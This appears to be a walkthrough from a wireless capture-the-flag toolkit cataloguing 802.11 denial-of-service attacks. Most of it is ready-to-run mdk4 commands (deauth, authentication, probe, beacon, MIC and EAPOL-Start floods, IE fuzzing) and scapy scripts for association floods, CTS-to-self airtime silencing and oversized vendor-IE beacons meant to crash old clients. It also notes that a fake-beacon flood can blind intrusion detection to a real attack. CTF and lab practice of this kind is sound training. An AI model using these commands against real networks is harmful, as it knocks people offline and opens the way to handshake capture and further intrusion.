# DoS — walkthrough

Management + control-frame denial-of-service families. This is the
"mdk4 mode catalog + a handful of extras" walkthrough. Use these when
the DoS itself is the flag signal (some WCTF puzzles fire on a
specific frame pattern) or when a controlled disruption is the
precondition for a follow-on attack (deauth → 4-way capture).

## Preconditions

- Monitor+injection interface (`wlan1mon` on the Pineapple).
- Target BSSID / channel identified.
- Ideally: a WIDS-observable path so you can tell "the AP crashed"
  from "the AP ignored me."

## Path A — mdk4 mode catalog

### `d` — Deauth flood

```
# Broadcast deauth (loudest)
mdk4 wlan1mon d -B AA:BB:CC:DD:EE:FF

# Channel-locked
mdk4 wlan1mon d -c 6 -B AA:BB:CC:DD:EE:FF

# Deauth-everyone-except-whitelist
mdk4 wlan1mon d -w /root/whitelist.txt
```

See `deauth/walkthrough.md` for reason-code and PMF details.

### `a` — Authentication flood

Sends 802.11 Authentication frames from spoofed STAs. Fills the
AP's authentication table.

```
mdk4 wlan1mon a -a AA:BB:CC:DD:EE:FF -m
```

Vulnerable APs stop accepting new legitimate authentications.

### `p` — Probe request flood

```
mdk4 wlan1mon p -c 6 -t AA:BB:CC:DD:EE:FF
```

Consumes AP CPU on probe response; often a nuisance more than a DoS.

### `b` — Beacon flood

Fake APs — a chosen SSID (or many). Confuses passive scanners.

```
# Single SSID, locked to channel 6, 500 pkts/sec.
mdk4 wlan1mon b -n TargetSSID -c 6 -s 500

# Many SSIDs from a wordlist (one per line).
mdk4 wlan1mon b -f /root/ssids.txt -c 6 -s 500
```

Also used to *distract* — a WIDS overwhelmed with fake beacons may
miss a genuine attack elsewhere.

### RTS/CTS NAV manipulation — NOT an mdk4 mode

mdk4 has no `v` mode; its valid mode set is `b/a/p/d/m/e/f/s/w/x/g`.
For the NAV-reservation primitive (CTS-to-self with a large Duration
field, 802.11 Control frame subtype 12, so ID=0x7fff maxes the NAV
at 32767 μs), use scapy — see [Path B: CTS-to-self
silencing](#cts-to-self-silencing) below.

### `m` — Michael MIC countermeasure

TKIP-only. Sends fabricated MIC-failure reports. If the AP receives
two within 60 s, TKIP mandates 60-second shutdown. Not applicable
against CCMP-only networks.

```
mdk4 wlan1mon m -t AA:BB:CC:DD:EE:FF
```

Almost extinct in 2026 (TKIP is dead in production) — but see the
"flag signal" section below.

### `e` — EAPOL-Start flood

For 802.1X targets. Each EAPOL-Start provokes an EAP-Request from
the authenticator. Fills the RADIUS backend's state.

```
mdk4 wlan1mon e -t AA:BB:CC:DD:EE:FF -n TargetSSID
```

mdk4 mode `e` needs `-t <BSSID>` and `-n <SSID>`; the older `-e`
flag has been dropped in current mdk4 builds.

### `f` — Fuzzed beacon / probe response

Malformed IE fuzzing. Historically crash-boots some clients on giant
Vendor-Specific IEs.

```
mdk4 wlan1mon f -c 6
```

## Path B — Non-mdk4 primitives

### Association-request flood

Fills the AP's association table.

```python
# scapy sketch
from scapy.all import *
for i in range(1000):
    src = "aa:bb:cc:%02x:%02x:%02x" % (i>>16 & 0xff, i>>8 & 0xff, i & 0xff)
    a = Dot11(type=0, subtype=0, addr1=AP_BSSID,
              addr2=src, addr3=AP_BSSID) / \
        Dot11AssoReq(cap=0x1104, listen_interval=10) / \
        Dot11Elt(ID=0, info="TargetSSID")
    sendp(RadioTap()/a, iface="wlan1mon", verbose=False)
```

<a id="cts-to-self-silencing"></a>
### CTS-to-self silencing (RTS/CTS NAV reservation)

Send frequent CTS-to-self frames with a large NAV duration. 802.11
radios that respect the NAV go quiet for the reserved airtime.
Control-frame subtype 12 = CTS; the Duration/ID field carries the
NAV in microseconds and maxes at 0x7FFF (32767 μs) per frame — chain
frames back-to-back to hold the medium.

```python
# 802.11 Control frame, subtype 12 (CTS). RA (addr1) = self, no TA.
cts = Dot11(type=1, subtype=12,
            addr1=YOUR_MAC,             # cts-to-self target = us
            ID=0x7fff)                  # max NAV = 32767 μs
sendp(RadioTap()/cts, iface="wlan1mon", verbose=False, loop=1,
      inter=0.001)                     # ~1000 pps → continuous NAV
```

### TIM / DTIM poisoning

Covered under `framing-frames/walkthrough.md`. Fabricate TIM/DTIM
frames to influence victim's power-save state.

### Malformed / oversized Vendor-Specific IE

Fuzz beacons with giant (>255 byte) vendor IEs. Some old client
stacks OOM. Historically effective against ESP32 pre-firmware-3,
some cheap IP cameras.

```python
big_ie = Dot11Elt(ID=221, info=(b"\x00\x50\xf2\x00" + b"A" * 1024))
b = Dot11(type=0, subtype=8,
          addr1="ff:ff:ff:ff:ff:ff",
          addr2=BSSID, addr3=BSSID) / \
    Dot11Beacon() / Dot11Elt(ID=0, info=b"CorpWiFi") / big_ie
sendp(RadioTap()/b, iface="wlan1mon", verbose=False)
```

## Path C — When a DoS IS the flag signal

Some WCTF puzzles fire the flag *when* a specific frame pattern
is seen:

- **Michael MIC failure** on a target BSSID within a window.
- **CTS-to-self** from a specific attacker MAC.
- **N deauth frames with a specific reason code**.

Read the puzzle brief. If the flag surface is "make this signal
appear on the wire," the DoS technique is the flag emitter, not a
disruption to avoid.

See `ctf/deauth-forensics.md` for the analysis side.

## Failure modes

- **PMF-required target.** Deauth, disassoc, some action-frame DoS
  paths close. Auth flood and assoc flood still work (unauthenticated
  frames). Beacon flood always works.
- **AP has rate limiting on authentication attempts.** Auth flood
  gets throttled without actually consuming state.
- **CTS-to-self ignored.** Some drivers ignore CTS-to-self from
  MACs not associated. Reduces effectiveness.
- **The DoS worked but wasn't the flag.** If the puzzle wasn't
  DoS-triggered, you've spent time and generated a lot of WIDS noise
  for nothing. Read the brief.

## Cite

- aircrack-ng documentation — mdk4 modes.
- IEEE Std 802.11-2020, §9.4 (management frames), §9.3.2.6 (Michael
  MIC countermeasure), §11.2 (power management, TIM/DTIM), §10.3
  (NAV).
- attacks.json: `deauth-*`, `authentication-flood`,
  `association-flood`, `beacon-flood-mdk4`, `probe-flood-mdk4`,
  `rts-cts-nav-dos`, `cts-to-self-silencing`, `eapol-start-flood`,
  `tkip-michael-mic-dos`, `ap-fuzzed-ies-crash`.
